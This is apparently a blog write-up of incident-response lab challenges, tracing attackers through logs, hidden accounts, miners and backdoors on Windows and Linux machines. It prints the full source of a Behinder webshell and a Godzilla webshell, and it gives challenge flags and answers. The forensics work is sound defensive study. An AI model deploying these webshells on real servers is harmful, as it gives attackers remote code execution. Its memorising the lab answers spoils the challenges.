---
title: 知攻善防WP
tags:
  - 应急响应
  - WP
categories:
  - 应急响应
swiper_index: 1
description: 对知攻善防靶场的一些复现笔记，不喜勿喷！
abbrlink: 6213db3a
date: 2026-01-04 16:27:09
---

# Web

## web渗透1

前景需要：
小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：

1.攻击者的shell密码
2.攻击者的IP地址
3.攻击者的隐藏账户名称
4.攻击者挖矿程序的矿池域名

用户：
administrator
密码
Zgsf@admin.com



### 第一个要找到shell密码，那我们首先就要找到shell，两种办法

1. 第一个直接用工具扫网站根目录（小皮面板打开）
2. 第二个手动分析日志文件

+ 工具:D盾、河马

![image-20250425224403142](posts/6213db3a/images/web_1_1_hemaWebShell.webp)

+ phpstud的yapache2的日志文件在C:\phpstudy_pro\Extensions\Apache2.4.39\logs
	+ 手动分析access.log.1708905600，发现明显木马痕迹

![image-20250425221903429](posts/6213db3a/images/web_1_log.webp)

可以看到木马在网站根目录下的/content/plugins/tips/

打开木马文件进行分析

```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>

```

用过冰蝎的应该一眼能看出，这是冰蝎3.0的aes128+base64的shell，而且是原密码没有改，也就是rebeyond，这样第一题就完成了



### 第二个要找到攻击者的ip地址，还是日志分析，发送shell.php的ip是192.168.126.1



### 第三个要找攻击者的隐藏用户名，这个有多种方式，一把梭是直接敲命令

+ `wmic useraccount get * /format:list`:可以列出用户
+ 在C:\Users下可以看到用户所创的个人文件夹，文件夹名就是用户名
+ 在设置账户下也可以看到其他用户

![image-20250425223836611](posts/6213db3a/images/web_1_3_useraccount.webp)

拿到隐藏用户名hack168$



### 第四个是拿到攻击者挖矿的矿池域名

1. 第一种，由于hack用户还没删除，可以修改hack用户密码直接登录，可以查看进行操作

	+ 使用命令修改hack用户密码：`net user hack168$ 123456qwe@123`
	+ 登录hack用户界面，发现可疑程序,点击运行，发现系统卡死，判断为挖矿程序
	+ 从该程序的图标可以推测该程序是使用[PyInstaller](https://muzing.gitbook.io/pyinstaller-docs-zh-cn)工具打包的的，因此可以使用pyinstxtractor脚本提取.pyc文件：https://github.com/extremecoders-re/pyinstxtractor

	![image-20250425224616304](posts/6213db3a/images/web_1_4_problem.webp)

	提取出PyInstaller打包的pyc文件后，可以使用[uncompyle6](https://github.com/rocky/python-uncompyle6)工具反编译Kuang.pyc文件，或者使用在线反编译网站：https://tool.lu/pyc/ ：

	![image-20250425225149393](posts/6213db3a/images/web_1_4_uncompile.webp)

	![image-20250425225345727](posts/6213db3a/images/web_1_4_codeSource.webp)

	成功拿到源码，其中requests.get之中就是矿池域名：wakuang.zhigonshangfang.top

2. 直接在administrator下使用everything搜索exe可执行文件，查找木马

![image-20250425230122620](posts/6213db3a/images/web_1_4_everythingSearchKuang.webp)

其实这里我们也可以看到这个程序是位于hack用户的desktop（桌面）上的



最后提交flag：

![image-20250425230537368](posts/6213db3a/images/web_1_5_submitflag.webp)

## web2

前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。

这是他的服务器系统，请你找出以下内容，并作为通关条件：

1.攻击者的IP地址（两个）？

2.攻击者的webshell文件名？

3.攻击者的webshell密码？

4.攻击者的伪QQ号？

5.攻击者的伪服务器IP地址？

6.攻击者的服务器端口？

7.攻击者是如何入侵的（选择题）？

8.攻击者的隐藏用户名？

相关账户密码

用户:administrator

密码:Zgsf@qq.com



### 1.要找攻击者ip，依旧是分析日志

![image-20250426211815239](posts/6213db3a/images/web2_1_log.webp)

很明显的扫描网站目录，高并发多请求，锁定一个ip192.168.135

![image-20250426212012005](posts/6213db3a/images/web2_1_logshell.webp)

#### 找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='hack6618';
$payloadName='payload';
$key='7813d1590d28a7dd';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

```

#### 确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的

![image-20250426213142240](posts/6213db3a/images/web_1_Godzillashell.webp)

问题里面有攻击者隐藏用户名，可以根据用户名判断他的行为，从而得到伪qq

#### 隐藏用户名依旧是命令一把梭：`wmic useraccount get * /format:list`

![image-20250426213558622](posts/6213db3a/images/web_1_hackuser.webp)

判断进行远程登录，可以事件查看器：`eventvwr`，筛选登录成功事件ID:4624

![image-20250426220405157](posts/6213db3a/images/web_1_eventvwrIP.webp)

拿到IP:192.168.126.129

或者使用日志分析工具：推荐使用WindowsLog_Check或者windows日志一键分析小工具，快速分析登录日志，得到攻击者的IP地址：

- WindowsLog_Check: https://github.com/Fheidt12/Windows_Log

### [2.webshell名](# 找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php)

### [3.webshell密码](# 确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的)

### 4.查找伪QQ号

登录QQ号，会在C:\Users\Administrator\Documents\Tencent Files产生一个文件夹，这个文件夹是QQ号的

拿到QQ号：777888999321

![image-20250426221707364](posts/6213db3a/images/web_4_qq.webp)

还看到有个frp的内网穿透，打开frp的配置文件

### 5/6.伪服务器ip的端口

![image-20250426222003753](posts/6213db3a/images/web_5and6_serverPort.webp)

拿到服务器ip：256.256.66.88

端口：65536

### 7.分析黑客如何入侵

打开网站插件目录，发现有FTP,分析FTP的日志，发现前面爆破账号密码，最后弱密码登录成功，传入哥斯拉木马system.php

![image-20250426222616449](posts/6213db3a/images/web_7_ftpLog.webp)

### [8.查找隐藏用户名](# 隐藏用户名依旧是命令一把梭：`wmic useraccount get * /format:list`)



全部题解：![image-20250426223042347](posts/6213db3a/images/web_8_allwp.webp)



## Web3

挑战内容

前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。

这是他的服务器，请你找出以下内容作为通关条件：

1. 攻击者的两个IP地址

2. 隐藏用户名称

3. 黑客遗留下的flag【3个】



本虚拟机的考点不在隐藏用户以及ip地址，仔细找找把。

相关账户密码：

Windows:administrator/xj@123456

### 攻击者的两个IP地址

第一个ip我们在事件查看器安全日志中筛选4624ID,进行有没有非法用户登录，以及查看非法用户的来源ip，也就是我们的攻击者ip

事件日志命令：`eventvwr`

#### 非法用户命令：`wmic useraccount  get * /format:list`

![image-20250429200809123](posts/6213db3a/images/web_3_1_hackUser.webp)

成功拿到隐藏用户：hack6618$

筛选4624事件ID之后，使用查找hack6618$,可以直接定位到非法用户登录日志

![image-20250429201409496](posts/6213db3a/images/web_3_1_ip1.webp)

成功拿到第一个ip:192.168.75.130

第二个ip查找日志，但是在Administrator下日志全是空的，所以我们修改非法用户密码，进行非法用户账号登录

命令：`net user hack6618$ 123456qwe@123`

登录非法用户进行日志查看，高并发访问网站的ip就是第二个攻击者ip

![image-20250429201917995](posts/6213db3a/images/web_3_1_ip2.webp)

拿到第二个攻击者ip:192.168.75.129

### [隐藏用户名称](# 非法用户命令：`wmic useraccount  get * /format:list`)

### 黑客留下的flag

### flag1

第一个flag在黑客留下的脚本执行当中，检查非法用户的下载行为

一把梭：win10会把用户访问过的文件保存成快速访问，可以直接定位到systm.bat文件

![image-20250429202825931](posts/6213db3a/images/web3_3_QuickVisit.webp)

通过命令行可以查看脚本文件执行的输出

![image-20250429203214266](posts/6213db3a/images/web_3_3_echoBat.webp)

拿到flag：

flag{888666abc}

### flag2

第二个flag在计划程序当中，命令：`taskschd.msc`

![image-20250429203646536](posts/6213db3a/images/web_3_3_taskschd.webp)

成功拿到第二个flag:

flag{zgsfsys@sec}

### flag3

第三个flag首先猜测在文件中，用dnGrep查找文件内容无果，只能猜测flag在网站之中

用phpstudy打开网站，访问z-blog，但是没有账号密码

![image-20250429204601686](posts/6213db3a/images/web_3_3_z-blogNoUserPassword.webp)

下面有两个方法可以拿到flag：

+ 使用z-blog密码恢复工具

[Z-BlogPHP密码找回工具-程序发布-ZBlogger技术交流中心](https://bbs.zblogcn.com/thread-83419.html)

直接找回密码，发现有一个hack用户，点进去查看信息，个人描述里面就是flag

![image-20250429205440733](posts/6213db3a/images/web_3_3_z-blogRecoveryPassword.webp)

![image-20250429205557576](posts/6213db3a/images/web_3_3_flag3.webp)

+ 使用mysql数据库查询hack数据，也能拿到flag

进入到D:\phpstudy_pro\Extensions\MySQL5.7.26\bin下，使用命令行登录

![image-20250429210049035](posts/6213db3a/images/web_3_3_mysqlCommand.webp)

查看个人信息

![image-20250429210315418](posts/6213db3a/images/web_3_3_hackInfo.webp)

拿到flag

flag{H@Ck@sec}



最后提交：

![image-20250429210625104](posts/6213db3a/images/web_3_3_allAnswer.webp)

## web近源攻击

前景需要：小王从某安全大厂被优化掉后，来到了某私立小学当起了计算机老师。某一天上课的时候，发现鼠标在自己动弹，又发现除了某台电脑，其他电脑连不上网络。感觉肯定有学生捣乱，于是开启了应急。

1.攻击者的外网IP地址

2.攻击者的内网跳板IP地址

3.攻击者使用的限速软件的md5大写

4.攻击者的后门md5大写

5.攻击者留下的flag



解题：

运行桌面上"解题工具.exe"即可



相关账户密码

Administrator

zgsf@2024

### 攻击者的外网地址

首先我想到的是翻log日志，但是后面问题又有内网跳板地址，估计用的是跳板的地址打的内网，所以到后面再看日志

做这道题首先要先了解宏病毒

#### 宏病毒

宏（英文Macro），广义上的定义是：宏就是把一系列的指令组织成一独立的命令，类似C语言中#define宏定义，避免同一动作的一再重复；狭义上，宏特指office系列办公软件中的宏，Microsoft Office中对宏的定义为“宏就是能够组织在一起的，可以作为一个独立命令来执行的一系列Word 命令，它能使日常工作变得容易。”本文中提到的宏，采用了狭义的定义，即office办公软件中的宏。

使用office打开文档文件(demo1.doc)时，有时候我们会遇到如下图所示的“安全警告”，这说明该文档文件中含有宏，并且office软件设置了“宏禁用”功能。

![image-20250521103934658](posts/6213db3a/images/web_4_1_define.webp)

这个时候，单击“启用内容”按钮，宏就会执行。

![image-20250521104034395](posts/6213db3a/images/web_4_1_defineAlert.webp)

使用快捷键Alt+F11可以打开vb编辑器，查看宏代码：

![image-20250521104112395](posts/6213db3a/images/web_4_1_catCode.webp)

本例中的宏很简单，其作用就是弹出一个对话框。

执行恶意功能的宏就是宏病毒。宏病毒是使用宏语言编写的恶意程序，存在于字处理文档、电子数据表格、数据库、演示文档等数据文件中，可以在office系列办公软件中运行，利用宏的功能将自己复制到其他数据文件中。宏病毒感染的是数据文件。宏病毒与传统的病毒有很大的不同，它不感染可执行文件，而是潜伏在Microsoft Office文档中，一旦用户打开含有宏的文档，其中的宏就会被执行。宏是使用VBA编写的，编写过程简单，任何人只需掌握一些基本的宏编写技能就可以编写出破坏力巨大的宏病毒。

宏病毒的强大是建立在强大的VBA组件的基础上的。同时，宏病毒与系统平台无关，任何计算机如果能够运行Microsoft Office办公软件，都有可能感染宏病毒。随着Microsoft Office系列办公软件成为电子文档的工业标准，Word，Excel和PowerPoint等已成为个人计算机和互联网上广泛使用的文档格式，宏病毒成为传播最广泛，危害最大的一类病毒。根据文档载体的不同，宏病毒可以细分为很多种，Word、Excel、Access、PowerPoint等都有想应的宏病毒。

**本质就是把病毒代码注入到office办公软件当中，office办公软件又有执行系统命令的功能，从而造成恶意系统命令执行**



回到题目，在我们了解宏病毒之后，我们就可以认为桌面上的几个office文件藏有宏病毒，丢到沙箱里面分析一下[样本报告-微步在线云沙箱](https://s.threatbook.com/report/file/03d4c25dca9cf02989ef091eea54a1203b0848d5b1bfa1ffb6192d6f52fcf029)，这里环境要改成和靶机相同的环境

![image-20250521104624892](posts/6213db3a/images/web_4_1_sandbox.webp)

拿到外网地址8.219.200.130

### 攻击者的内网跳板IP地址

这里我们去翻apache的log日志，可以查到两个ip地址

![image-20250521111434460](posts/6213db3a/images/web_4_2_apacheLog.webp)

其实这里你一个一个去解题那里试一下（可以试出来是192.168.20.129）但这不是预期解

预期解是桌面上的phpstudy修复程序有问题，上面给的是快捷方式，打开文件位置看一下

![image-20250521112107499](posts/6213db3a/images/web_4_2_hideExt.webp)

这里要开启隐藏文件查看，可以发现有一个脚本文件，改后缀用记事本看一下

![image-20250521112516020](posts/6213db3a/images/web_4_2_powershellCMD.webp)

拿到内网跳板地址：192.168.20.129

### 攻击者使用的限速软件的md5大写

使用everything查.exe可运行程序后缀，按修改时间排序，发现可疑程序和可疑路径

![image-20250521161832465](posts/6213db3a/images/web_4_3_everything.webp)

打开发现是[p2p终结者_百度百科](https://baike.baidu.com/item/p2p终结者/110375)

![image-20250521161956763](posts/6213db3a/images/web_4_3_p2pover.webp)

用[hash计算器](https://keir.net/)计算软件后门的MD5即可

![image-20250521162627108](posts/6213db3a/images/web_4_3_hashCalculator.webp)

拿到限速软件的大写MD5

### 攻击者的后门md5大写

使用everything查.exe可运行程序后缀，按修改时间排序,这里第二个桌面上的是我复制去的

![image-20250521161210813](posts/6213db3a/images/web_4_4_everything.webp)

##### 打开发现是[粘滞键后门攻击：恶意软件利用系统漏洞](https://blog.csdn.net/wh00000001/article/details/132176123)，简单来说就是，恶意程序顶替正常程序，从而触发恶意代码

![image-20250521161440984](posts/6213db3a/images/web_4_4_shiftBackDoor.webp)

依然是用前面说到的的hash计算器计算软件的大写MD5

![image-20250521163118162](posts/6213db3a/images/web_4_4_hashCalculatorBackDoor.webp)

拿到后门程序的MD5:58A3FF82A1AFF927809C529EB1385DA1

### 攻击者留下的flag

前面后门程序打开第一行就是flag

[flag{zgsf@shift666}](# 打开发现是[粘滞键后门攻击：恶意软件利用系统漏洞](https://blog.csdn.net/wh00000001/article/details/132176123)，简单来说就是，恶意程序顶替正常程序，从而触发恶意代码)

## web挖矿案例

挑战内容：

前景需要：机房运维小陈，下班后发现还有工作没完成，然后上机器越用越卡，请你帮他看看原因。



1. 攻击者的IP地址
2. 攻击者开始攻击的时间
3. 攻击者攻击的端口
4. 挖矿程序的md5
5. 后门脚本的md5
6. 矿池地址
7. 钱包地址
8. 攻击者是如何攻击进入的



相关账户密码：

Administrator/zgsf@123

### 攻击者的IP地址和攻击时间、攻击端口

这里我们分析攻击者登录失败日志

事件查看器命令：`eventvwr`，事件ID:4625,分析安全日志

![image-20250525003622969](posts/6213db3a/images/web_5_1_eventvwr.webp)

爆破的特征之一就是高并发，说明有人在爆破rdp，也就是3389端口

查看最早事件攻击的事件，发现攻击者ip和时间

![image-20250525003918979](posts/6213db3a/images/web_5_1and2_timeAndIP.webp)

拿到攻击者IP：192.168.115.131

攻击时间：2024-05-21 20:25:22

攻击端口：3389

或者使用日志分析工具：推荐使用WindowsLog_Check或者windows日志一键分析小工具，快速分析登录日志，得到攻击者的IP地址：

- WindowsLog_Check: https://github.com/Fheidt12/Windows_Log

### 挖矿程序的md5

做题发现卡卡的，打开任务管理器看一下，结果有个程序占满了cpu，那就是挖矿程序没跑了

![image-20250602180406669](posts/6213db3a/images/web_5_2_mining.webp)

先把挖矿程序暂停了，在任务管理器的服务里将挖矿程序从自动改为禁用

![image-20250602181842824](posts/6213db3a/images/web_5_2_serviceForbidden.webp)

用任务管理器可以打开该挖矿程序的具体位置，然后用MD5计算器计算该程序的MD5

![image-20250602185100566](posts/6213db3a/images/web_5_2_MD5calc.webp)

拿到挖矿程序的MD5:

> A79D49F425F95E70DDF0C68C18ABC564

### 后门脚本的MD5

发现在任务管理器终止任务之后，又自启动了该程序，那就要排查两个点，一个是注册表，一个是计划任务

`regedit`进入注册表，排查启动项（HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run）

发现可疑脚本

![image-20250602181034531](posts/6213db3a/images/web_5_2_regeditBat.webp)

定位到该文件位置（C:\Users\Administrator\AppData\systems.bat），查看该文件信息

![image-20250602185520740](posts/6213db3a/images/web_5_3_catBatInfo.webp)

发现为powershell自动下载挖矿程序的脚本，计算该脚本的MD5

![image-20250602185716897](posts/6213db3a/images/web_5_3_MD5calc.webp)

拿到后门脚本的MD5

> 8414900F4C896964497C2CF6552EC4B9

### 矿池地址

回到挖矿程序文件位置，查看配置信息（不让看，就删除后缀，然后用记事本查看）

![image-20250602190027282](posts/6213db3a/images/web_5_4_C3pool.webp)

成功拿到矿池地址

> auto.c3pool.org

### 钱包地址

直接搜索[c3pool.org ](https://c3pool.org/#/)或者[猫池](https://c3pool.com/oldui/cn/)，进入网站进行查询user

![image-20250602190439272](posts/6213db3a/images/web_5_5_c3poolOrg.webp)

可以在选择地址位置，知道我们搜索的user就是矿池地址

![image-20250602190622392](posts/6213db3a/images/web_5_5_C3Poolcom.webp)

这个网址可以查询到账号和密码

### 攻击者是怎么入侵的

回到最开始的最开始拿到攻击者的ip地址和时间、端口的事件查看器

可以知道攻击者是爆破3389RDP的远程登录密码，进行攻击的



最后提交：

![image-20250602191015243](posts/6213db3a/images/web_5_6_submit.webp)

# Linux

## linux1

前言:小王急匆匆地找到小张，小王说"李哥，我dev服务器被黑了",快救救我！！



挑战内容：

黑客的IP地址

遗留下的三个flag

相关账户密码：

defend/defend

root/defend



### 黑客的ip地址

黑客登录会留下登录日志，直接查看/var/log/secure

一把梭命令（查看哪些主机爆破了多少次）：`grep "Failed password for root" /var/log/secure| awk '{print $11}' |sort |uniq -c |sort -nr`

直接拿到黑客登录的ip地址

![image-20250507211627192](posts/6213db3a/images/linux_1_1_remainIP.webp)

### flag1

切换到root用户，查看history记录，每个用户的history是不同的，拿到flag

![image-20250507212006980](posts/6213db3a/images/linux_1_2_history.webp)

拿到flag

> flag{thisismybaby}

### flag2

上面他去rc.d/rc.local，这是系统开机项配置文件，我们也去看看

![image-20250507212316807](posts/6213db3a/images/linux_1_2_rclocal.webp)

拿到flag

> flag{kfcvme50}

### flag3

回到我们的/var/log，发现有redis，查看一下登录情况

![image-20250507213416490](posts/6213db3a/images/linu_1_4_reidslog.webp)

发现黑客通过redis登录成功的，查看一下redis.conf（redis的配置文件）

![image-20250507213655726](posts/6213db3a/images/linux_1_4_redisconf.webp)

拿下最后一个flag

> flag{P@ssW0rd_redis}



如果是打ctf的话，可以直接用在常用目录下一把梭命令：`grep -inr flag{ /etc`



最后提交

![image-20250507213823559](posts/6213db3a/images/linux_1_submitflag.webp)

## Linux2

挑战内容

前景需要：看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！



1,提交攻击者IP

2,提交攻击者修改的管理员密码(明文)

3,提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg)

3,提交Webshell连接密码

4,提交数据包的flag1

5,提交攻击者使用的后续上传的木马文件名称

6,提交攻击者隐藏的flag2

7,提交攻击者隐藏的flag3



相关账户密码：

root/Inch@957821.



这里官方给的账户密码登录不了，推荐使用https://www.linuxidc.com/Linux/2014-10/107689.htm（修改密码）



### 提交攻击者的ip

首先要了解各种集成面板的特征，/www是宝塔面板的特征。直接输入命令bt

![image-20250512154626305](posts/6213db3a/images/linux_2_1_bt.webp)

因为不知道登录面板的命令，首先输入5修改面板密码，

![image-20250512155047651](posts/6213db3a/images/linux_2_1_modifyBTpasswd.webp)

接着输入3启动面板，输入14查看面板登录地址

![image-20250512155243499](posts/6213db3a/images/linux_2_1_BTlogin.webp)

首先添加域名，让我们可以通过内网域名访问服务器搭建起来的网站服务

<img src="/posts/6213db3a/images/linux_2_1_BTaddDomain.webp" alt="image-20250512155600913" style="zoom: 33%;" />

查看网站日志，统计访问IP

![image-20250512155750436](posts/6213db3a/images/linux_2_1_BTattackIP.webp)

这里可以看到192.168.20.1攻击了317次，直接锁定

还有第二种解法，通过一把梭命令筛选访问日志

`awk '{print $1}' /www/wwwlogs/127.0.0.1.log | sort | uniq -c | sort -nr`

![image-20250512160622519](posts/6213db3a/images/linux_2_1_logCommand.webp)

也可以拿到攻击者ip

### 提交攻击者修改的管理员密码（明文）

这里的管理员密码是指网站的管理员密码，那我们直接登录数据库查看

![image-20250512161917531](posts/6213db3a/images/linux_2_2_mysqlLogin.webp)

切换到kaoshi数据库

`use kaoshi;`

查看有哪些表

`show tables;`

发现有users表

![image-20250512162138293](posts/6213db3a/images/linux_2_2_userTables.webp)

直接查看users表数据：`select * from x2_user\G`

![image-20250512162322647](posts/6213db3a/images/linux_2_2_admin.webp)

这个peadmin一看就是管理员，密码一般都是md5加密的，推荐这个网站进行md5解密[土薯在线工具](https://toolshu.com/crackmd5)

![image-20250512162529177](posts/6213db3a/images/linux_2_2_md5Decode.webp)

成功拿到md5解密密码：Network@2020

第二种解法也可以使用（BT面板登录）phpmyadmin直接查看

![image-20250512163043744](posts/6213db3a/images/linux_2_2_phpmyadmin.webp)

### 提交第一次webshell连接的URL(只用交参数)

webshell特征：@eval

直接一把梭命令查找webshell

![image-20250512163323463](posts/6213db3a/images/linux_2_3_webshellFeature.webp)

成功锁定两个URL:

> /data/html/user/tpls/app/register.html
>
> /data/html/content/tpls/master/blocks_modify.html

登录管理员账户进行查看

![image-20250512163906412](posts/6213db3a/images/linux_2_3_webLogin.webp)

#### 第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面

<img src="/posts/6213db3a/images/linux_2_3_webshellHint.webp" alt="image-20250512165317201"  />

直接查询日志，看攻击者ip的访问日志

![image-20250512170017544](posts/6213db3a/images/linux_2_3_webshellURL.webp)

成功拿到第一次webshell

> index.php?user-app-register

### [提交webshell的密码](# 第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面)

Network2020

### 提交数据包的flag1

数据包就在/root下，把数据包拖出来用wireshark分析，过滤http协议

![image-20250512170710485](posts/6213db3a/images/linux_2_5_wiresharkHTTP.webp)

直接就发现了flag，追踪流看一下找到flag

![image-20250512170904784](posts/6213db3a/images/linux_2_5_flag1.webp)

> flag1{Network@_2020_Hack}

### 提交攻击者后续上传木马名称

过滤一下POST请求，发现只有两个php文件，第一个是我们提交webshellURL,那第二个肯定是后续上传的木马了（有点预期解了），我们分析一下吧

![image-20250512172108050](posts/6213db3a/images/linux_2_6_wiresharkAnalysis.webp)

追踪第一个木马看一下

![image-20250512172309553](posts/6213db3a/images/linux_2_6_webshellAnalysisAnt.webp)

这个ini_set一眼就是蚁剑（不知道的，用蚁剑挂bp代理，中间抓包看一下）

追踪第二个木马看一下

![image-20250512173416853](posts/6213db3a/images/linux_2_6_webshellAnalysisBinder.webp)

这里是冰蝎的流量特征，这里说一下冰蝎的流量特征

```text
建立连接后的cookie存在特征字符
所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/

冰蝎4
Accept: application/json, text/javascript, /; q=0.01 
Content-type: Application/x-www-form-urlencoded 
```

木马文件是version2.php

### flag2

一把梭命令：`grep -inr 'flag{' /www`

![image-20250512174131694](posts/6213db3a/images/linux_2_7_flag2Command.webp)

拿到flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}

### flag3

其实这个在history可以查到，但是也有一把梭命令

一把梭命令：`grep -inr 'flag{' /etc`

![image-20250512174320920](posts/6213db3a/images/linux_2_7_flag3Command.webp)

## easy溯源

挑战内容

小张是个刚入门的程序猿，在公司开发产品的时候突然被叫去应急，小张心想"早知道简历上不写会应急了"，于是call了运维小王的电话，小王说"你面试的时候不是说会应急吗？伪造简历吗？真该死。"

1. 攻击者内网跳板机IP地址
2. 攻击者服务器地址
3. 存在漏洞的服务(提示:7个字符)
4. 攻击者留下的flag(格式zgsf{})
5. 攻击者邮箱地址
6. 攻击者的ID名称



相关账号密码

Ubuntu：zgsfsys/zgsfsys

### 攻击者内网跳板机IP地址

这题有多解，一解是我们看到根目录下面有www（BT面板的默认操作）

（要有root权限）：

+ 修改BT面板密码：bt 5
+ 查看BT面板默认信息：bt 14

![image-20250521224034626](posts/6213db3a/images/linux_3_1_BTinfo.webp)

登录BT面板（密码是你之前bt 5修改的默认密码）

![image-20250521224315097](posts/6213db3a/images/linux_3_1_btAnalysisIP.webp)

找到内网攻击ip：192.168.11.129

原理是一样的，使用命令一把梭分析日志:`grep -v '127.0.0.1' 0.0.0.0.log | awk '{print$1}' | uniq -c | sort -nr | uniq`

![image-20250521224846195](posts/6213db3a/images/linux_3_1_commandAnalysisIP.webp)

一样能找到攻击最多的ip

二解是我们看到根目录下面有个1很可疑

![image-20250521225400164](posts/6213db3a/images/linux_3_1_rootInfo.webp)

vim 1 看一下内容

![image-20250521225227597](posts/6213db3a/images/linux_3_1_vim1.webp)

看到是反弹shell常用命令，反弹的shell是192.168.11.129

三解是在zgsfsys用户下查看history，可以看到一些base64编码

![image-20250521225557786](posts/6213db3a/images/linux_3_1_historyInfo.webp)

丢到base64解码看一下

![image-20250521225736986](posts/6213db3a/images/linux_3_1_base64Decode.webp)

这样也可以看到反弹shell的ip是192.168.11.129

### 攻击者服务器地址

回到root用户下，看一下用户家目录下有什么，结果发现frpc（内网穿透工具）

![image-20250521230100265](posts/6213db3a/images/linux_3_2_frpcDIR.webp)

看一下frpc的配置文件（frpc.toml）就可以发现攻击者的外网地址

![image-20250521230236460](posts/6213db3a/images/linux_3_2_frpctoml.webp)

成功找到外网地址：156.66.33.66

### 存在漏洞的服务（提示：7个字符）

回到zgsfsys用户，查看history，发现有大量操作jenkins的记录

![image-20250521230516123](posts/6213db3a/images/linux_3_3_historyInfojenkins.webp)

##### jenkins默认监听8080端口，直接访问看看

![image-20250521230838659](posts/6213db3a/images/linux_3_3_jenkinsWeb.webp)

发现有未授权漏洞，因为我们正常访问是需要账号密码登录的（jenkins可以进行系统命令操作，造成反弹shell）

所以这里存在漏洞的服务就是：jenkins

### 攻击者留下的flag

[看一下jenkins里面的标签，就是flag](# jenkins默认监听8080端口，直接访问看看)

既然给了我们flag格式，我们就可以用一把梭命令

`grep -inr 'zgsf{' /var`

![image-20250521232938654](posts/6213db3a/images/linux_3_4_Commandflag.webp)

### 攻击者的邮箱和ID

![image-20250521231348520](posts/6213db3a/images/linux_3_5and6_officalInfo.webp)



## WhereIS

前言:

一个风雨交加的夜晚，安服仔小唐，突然发现公司分配给自己的测试服务器不正常了，似乎有什么不对劲？

小唐为何频繁流汗？

服务器为何频繁数据外带？

24岁小唐竟然无从下手！

到底是道德的沦丧还是人性的扭曲？



在此之前，你要获得以下信息

【1】攻击者的两个ip地址

【2】flag1和flag2

【3】后门程序进程名称

【4】攻击者的提权方式(输入程序名称即可)

### 攻击者的两个ip地址

切换成root用户，查看history

![image-20250528172620903](posts/6213db3a/images/linux_4_1_history.webp)

发现了几个敏感路径和敏感命令，有端口输出怀疑是反弹shell，切换到/home就发现了可疑程序

![image-20250528172932528](posts/6213db3a/images/linux_4_1_DoubtPath.webp)

查看system.sh的内容，标准的反弹shell，锁定一个攻击者ip

![image-20250528173231784](posts/6213db3a/images/linux_4_1_bashShell.webp)

攻击者ip:192.168.31.64

进入/`home/.system_config`文件夹,`ls -al`查看所有文件夹，根据历史命令，可以推断system.log是日志文件，这里我们查看这个日志文件也能发现第一个攻击者的ip是192.168.31.64

![image-20250528175302588](posts/6213db3a/images/linux_4_1logIP.webp)

###### 这里的systemd_null丢给沙箱竟然分析不出来，把这个和history中的反弹shell命令丢给ai，ai告诉我们这是起一个web服务器，服务器的服务就是RCE

![image-20250528175442483](posts/6213db3a/images/linux_4_1_pathSystemconfig.webp)

![image-20250528175757325](posts/6213db3a/images/linux_4_1_systemdnullAnalysis.webp)

把他的命令执行，这里我们尝试连接一下

![image-20250528180934418](posts/6213db3a/images/linux_4_1_systemdnullShell.webp)

这里这个木马不认识，有懂行的大佬可以说一声，只知道是elf木马

找到后门程序进程名称：systemd_null

##### 查看/home目录下的另外一个隐藏文件夹可以得到其中一个flag

![image-20250528181420976](posts/6213db3a/images/linux_4_1_flag1.webp)

拿到flag1：SYS{ZGSFYYDSadmin}

还是根据历史命令和桌面上的运行脚本，怀疑其余答案在docker镜像里面

先用`docker images`查看有哪些镜像

![image-20250528181753957](posts/6213db3a/images/linux_4_1_dockerImages.webp)

发现有一个vulfocus的靶场镜像，此地无银三百两，那这题基本就是thinkphp漏洞了

使用桌面运行脚本打开5个docker容器，这里权限不够，使用sudo改变脚本权限

![image-20250528182231870](posts/6213db3a/images/linux_4_1_Desktop.webp)

直接查看thinkphp的日志：`docker logs --tail 100 thinkphpHUB`

![image-20250528194431295](posts/6213db3a/images/linux_4_1_dockerlog.webp)

成功发现第二个攻击ip：192.168.31.251

### flag1和flag2

flag1在前面的[home目录下的.system](# 查看/home目录下的另外一个隐藏文件夹可以得到其中一个flag)

